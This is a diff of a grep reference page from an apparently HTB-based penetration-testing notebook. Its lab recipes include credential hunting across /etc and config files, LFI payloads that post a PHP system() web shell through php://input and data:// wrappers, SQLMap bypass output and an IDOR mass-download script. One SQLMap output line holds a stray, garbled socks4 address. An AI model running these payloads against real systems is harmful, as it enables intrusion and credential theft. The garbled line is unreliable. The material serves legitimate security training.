@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/grep.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Search a bounded application directory with source lines
+[Search this tool’s saved examples](/commands/notebook?tool=grep) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Search a bounded application directory with source lines
 
 **Run in:** Linux target. **Requires:** A real readable application directory; -I skips binary files and permission errors may leave gaps.
 
@@ -21,112 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 grep -RniI -- 'password' /opt/APP
 ```
 
-**Read the result:** Retain filenames and line numbers so each match can be checked in context.
-
-**If Matches are placeholders, comments or stale settings:** Regex and literal searches differ; quoting, binary files and recursive scope can produce missing or misleading matches.
+**What the result establishes:** Retain filenames and line numbers so each match can be checked in context.
 
 **Next check:** Inspect surrounding configuration and identify the service/account using it before testing a candidate secret.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://www.gnu.org/software/grep/manual/grep.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## grep: choose the operation and read the result
-
-Search text in files.
-
-### What the result establishes
-
-Retain filenames and line numbers so each match can be checked in context.
-
-### Prerequisites and common failures
-
-Regex and literal searches differ; quoting, binary files and recursive scope can produce missing or misleading matches.
-
-### Example 1: Commands
-
-Run in: **Linux target**.
-
-```bash
-grep -ri "password" /etc 2>/dev/null
-grep -n "PATTERN" file.txt
-```
-
-### Example 2: Find Credentials on Linux
-
-Run in: **Saved lab example**.
-
-```bash
-ls -l .mozilla/firefox/ | grep default
-```
-
-Saved context: [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Find Credentials on Linux
-
-Run in: **Saved lab example**.
-
-```bash
-for l in $(echo ".conf .config .cnf");do echo -e "\nFile extensions: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
-```
-
-Saved context: [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Find Credentials on Linux
-
-Run in: **Saved lab example**.
-
-```bash
-for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
-```
-
-Saved context: [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Find Credentials on Linux
-
-Run in: **Saved lab example**.
-
-```bash
-for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
-```
-
-Saved context: [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Find Credentials on Linux
-
-Run in: **Saved lab example**.
-
-```bash
-for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
-```
-
-Saved context: [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Find Credentials on Linux
-
-Run in: **Saved lab example**.
-
-```bash
-for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
-```
-
-Saved context: [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Search text in files.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=grep) · [All tools](/index)
 
 ## Commands
 
@@ -137,18 +42,15 @@ grep -ri "password" /etc 2>/dev/null
 grep -n "PATTERN" file.txt
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [Bash quoting and pipelines — Example 1: Commands](/field/bash#example-1-commands-2)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| Matches are placeholders, comments or stale settings | Regex and literal searches differ; quoting, binary files and recursive scope can produce missing or misleading matches. |
 
 ## Notebook recipes
 
-70 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+91 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -164,7 +66,7 @@ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [AD Password Policies and User Lists — Password Spraying - Making a target user list](/active-directory/password-policy-user-lists#password-spraying-making-a-target-user-list) · [awk for lab output — Example 1: Password Spraying - Making a target user list](/field/awk#example-1-password-spraying-making-a-target-user-list)
+**Original note sections:** [AD Password Policies and User Lists — Password Spraying - Making a target user list](/active-directory/password-policy-user-lists#password-spraying-making-a-target-user-list)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -272,21 +174,40 @@ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
 
 </Accordion>
 
-<Accordion title="7. Stage 2 — discovering the real payload is still hidden">
+<Accordion title="Joomla">
 
-### 7. Stage 2 — discovering the real payload is still hidden
+### Joomla
 
-**Android Banking Trojan: Reverse-Engineering Walkthrough**
+**Attacking Common Applications**
 
 ```bash
-# Following the chain — read one, see what it calls, repeat
-cat stage2_jadx/sources/org/core/Btblwin.java
-grep -rn "Wjpye\." stage2_jadx/sources/ --include="*.java"
+curl -s http://TARGET_IP/administrator/manifests/files/joomla.xml | grep '<version>'
+curl -s http://TARGET_IP/README.txt | head -n 20
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Android Banking Trojan: Reverse-Engineering Walkthrough — 7. Stage 2 — discovering the real payload is still hidden](/research/android-malware-walkthrough#7-stage-2-—-discovering-the-real-payload-is-still-hidden)
+**Original note sections:** [Attacking Common Applications — Joomla](/web/common-applications#joomla)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="WordPress">
+
+### WordPress
+
+**Attacking Common Applications**
+
+```bash
+curl -s http://TARGET_IP/ | grep -i 'wp-content\|generator'
+wpscan --url http://TARGET_IP/ --enumerate u,ap,at --api-token YOUR_TOKEN
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Common Applications — WordPress](/web/common-applications#wordpress)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -381,7 +302,7 @@ Password:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 5: Grabbing the Domain SID & Attaching to Enterprise Admin's RID](/enumeration/rpcclient-cheat-sheet#example-5-grabbing-the-domain-sid-&-attaching-to-enterprise-admins-rid) · [Child to Parent Trusts - Linux — Grabbing the Domain SID & Attaching to Enterprise Admin's RID](/active-directory/trusts-child-parent-linux#grabbing-the-domain-sid-&-attaching-to-enterprise-admins-rid)
+**Original note sections:** [Child to Parent Trusts - Linux — Grabbing the Domain SID & Attaching to Enterprise Admin's RID](/active-directory/trusts-child-parent-linux#grabbing-the-domain-sid-&-attaching-to-enterprise-admins-rid)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -404,7 +325,7 @@ Password:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 2: Looking for the Domain SID](/enumeration/rpcclient-cheat-sheet#example-2-looking-for-the-domain-sid) · [Child to Parent Trusts - Linux — Looking for the Domain SID](/active-directory/trusts-child-parent-linux#looking-for-the-domain-sid)
+**Original note sections:** [Child to Parent Trusts - Linux — Looking for the Domain SID](/active-directory/trusts-child-parent-linux#looking-for-the-domain-sid)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -429,6 +350,27 @@ sudo nmap -p443 -sV --script ssl-cert <TARGET>
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — How to spot it on a scan](/enumeration/citrix-netscaler#how-to-spot-it-on-a-scan)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Encoded Commands">
+
+### Encoded Commands
+
+**Command Injections — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -481,7 +423,7 @@ SMB = Off
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks) · [Responder — Interface and Startup — Example 6: Forced Authentication Attacks](/tools/responder#example-6-forced-authentication-attacks)
+**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -569,6 +511,170 @@ grep '\.200\.'
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [DNS and Web Reconnaissance: Full Workflow — Regex vs Shell Globs](/recon/dns-web-recon-cheat-sheet#regex-vs-shell-globs)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Search and compare local evidence">
+
+### Search and compare local evidence
+
+**Everyday Terminal Commands: Guide Link**
+
+```bash
+rg -n -i 'password|credential|connectionstring' notes loot
+find loot -type f -iname '*config*'
+sort discovered-users.txt | uniq -c
+wc -l discovered-users.txt
+file loot/artifact
+sha256sum loot/artifact
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Everyday Terminal Commands: Guide Link — Search and compare local evidence](/tools/common-commands#search-and-compare-local-evidence)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Checking PHP Configurations">
+
+### Checking PHP Configurations
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+
+Excellent! We see that we have this option enabled, so we can use the data wrapper. Knowing how to check for the allow_url_include option can be very important, as this option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Checking PHP Configurations](/web/htb/file-inclusion#checking-php-configurations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Expect">
+
+### Expect
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+
+extension=expect
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Expect](/web/htb/file-inclusion#expect)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Expect](/web/htb/file-inclusion#expect)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Input">
+
+### Input
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Input](/web/htb/file-inclusion#input)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote Code Execution">
+
+### Remote Code Execution
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Remote Code Execution](/web/htb/file-inclusion#remote-code-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verify RFI">
+
+### Verify RFI
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Verify RFI](/web/htb/file-inclusion#verify-rfi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Content-Type">
+
+### Content-Type
+
+**File Upload Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+grcic550@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — HTB Module — Content-Type](/web/htb/file-upload-attacks#content-type)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -872,7 +978,7 @@ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extensions: " $l; find 
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 3: Find Credentials on Linux](/field/bash#example-3-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -885,7 +991,7 @@ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFi
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 4: Find Credentials on Linux](/field/bash#example-4-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -898,7 +1004,7 @@ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; fin
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 5: Find Credentials on Linux](/field/bash#example-5-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -911,7 +1017,7 @@ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " 
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 6: Find Credentials on Linux](/field/bash#example-6-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -924,7 +1030,7 @@ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 7: Find Credentials on Linux](/field/bash#example-7-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -937,7 +1043,7 @@ ls -l .mozilla/firefox/ | grep default
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 2: Find Credentials on Linux](/field/bash#example-2-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1046,7 +1152,36 @@ snmpwalk -v2c -c <community> <IP> | grep -i "user\|pass\|login\|htb"
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — SNMP (Port 161 UDP)](/enumeration/footprinting-lab-methodology-cheat-sheet#snmp-port-161-udp) · [SNMP Enumeration, OIDs, and Community Strings — Example 4: SNMP (Port 161 UDP)](/enumeration/snmp-enumeration-simple-network-management-protocol#example-4-snmp-port-161-udp) · [SNMP Enumeration, OIDs, and Community Strings — Example 3: SNMP (Port 161 UDP)](/enumeration/snmp-enumeration-simple-network-management-protocol#example-3-snmp-port-161-udp)
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — SNMP (Port 161 UDP)](/enumeration/footprinting-lab-methodology-cheat-sheet#snmp-port-161-udp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Establish a baseline and compare methods">
+
+### Establish a baseline and compare methods
+
+**HTTP Verb Tampering**
+
+```bash
+BASE='http://TARGET:PORT'
+ENDPOINT='/admin/status.php'  # Replace with an observed route.
+mkdir -p evidence/verbs
+curl -sS -D evidence/verbs/get.headers -o evidence/verbs/get.body "$BASE$ENDPOINT"
+curl -sS -X OPTIONS -D evidence/verbs/options.headers \
+  -o evidence/verbs/options.body "$BASE$ENDPOINT"
+curl -sS -I "$BASE$ENDPOINT" > evidence/verbs/head.headers
+curl -sS --data '' -D evidence/verbs/post.headers \
+  -o evidence/verbs/post.body "$BASE$ENDPOINT"
+rg -n 'HTTP/|Allow:|WWW-Authenticate:|Location:|Content-Length:' evidence/verbs/*.headers
+wc -c evidence/verbs/*.body
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTTP Verb Tampering — Establish a baseline and compare methods](/web/verb-tampering#establish-a-baseline-and-compare-methods)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1192,7 +1327,7 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Files containing passwords](/privesc/linux-privesc-checklist#files-containing-passwords) · [Bash quoting and pipelines — Example 5: Files containing passwords](/field/bash#example-5-files-containing-passwords)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Files containing passwords](/privesc/linux-privesc-checklist#files-containing-passwords)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1231,7 +1366,7 @@ strings -n 5 dumpfile | grep -i pass
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — In memory passwords](/privesc/linux-privesc-checklist#in-memory-passwords) · [Bash quoting and pipelines — Example 6: In memory passwords](/field/bash#example-6-in-memory-passwords)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — In memory passwords](/privesc/linux-privesc-checklist#in-memory-passwords)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1250,7 +1385,7 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Last edited files](/privesc/linux-privesc-checklist#last-edited-files) · [Bash quoting and pipelines — Example 2: Last edited files](/field/bash#example-2-last-edited-files)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Last edited files](/privesc/linux-privesc-checklist#last-edited-files)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1292,7 +1427,7 @@ cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server confi
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 6: Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#example-6-key-commands) · [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands)
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1574,6 +1709,58 @@ proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]
 
 </Accordion>
 
+<Accordion title="Calculated Parameter Bypass">
+
+### Calculated Parameter Bypass
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Calculated Parameter Bypass](/web/htb/sqlmap-essentials#calculated-parameter-bypass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Unique Value Bypass">
+
+### Unique Value Bypass
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Unique Value Bypass](/web/htb/sqlmap-essentials#unique-value-bypass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Identifying Your Shell">
 
 ### Identifying Your Shell
@@ -1605,6 +1792,147 @@ $PSVersionTable
 
 </Accordion>
 
+<Accordion title="4. Start the Chisel server on Kali">
+
+### 4. Start the Chisel server on Kali
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+ip -br address
+ss -lntp | grep ':8000'
+chisel --version
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — 4. Start the Chisel server on Kali](/pivoting/methodology#4-start-the-chisel-server-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Mass Enumeration">
+
+### Mass Enumeration
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
+
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Repeatable enumeration loop">
+
+### Repeatable enumeration loop
+
+**Web Attacks: Enumeration and Attack Chains**
+
+```bash
+# Kali: use the host, port and cookie from your current lab session.
+BASE='http://TARGET:PORT'
+SESSION='REPLACE_WITH_CURRENT_SESSION'
+mkdir -p evidence/web-attacks
+curl -sS --compressed -b "PHPSESSID=$SESSION" \
+  -D evidence/web-attacks/profile.headers \
+  -o evidence/web-attacks/profile.html "$BASE/profile.php"
+rg -n 'fetch\(|api\.php|token|uid|reset|\.js' evidence/web-attacks/profile.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks: Enumeration and Attack Chains — Repeatable enumeration loop](/web/web-attacks#repeatable-enumeration-loop)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read what the application already exposes">
+
+### Read what the application already exposes
+
+**Web Enumeration**
+
+```bash
+curl -sS "$BASE/robots.txt"
+curl -sS "$BASE/sitemap.xml"
+rg -n 'href=|src=|action=|<!--' landing.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Read what the application already exposes](/web/web-enumeration#read-what-the-application-already-exposes)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Enumeration**
+
+```bash
+curl -sS "$BASE/js/app.js" -o app.js
+rg -n 'fetch\(|axios|/api/|url:|endpoint|token' app.js
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Read what the application already exposes](/web/web-enumeration#read-what-the-application-already-exposes)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="EoP - Processes Enumeration and Tasks">
 
 ### EoP - Processes Enumeration and Tasks
@@ -1626,72 +1954,119 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 
 </Accordion>
 
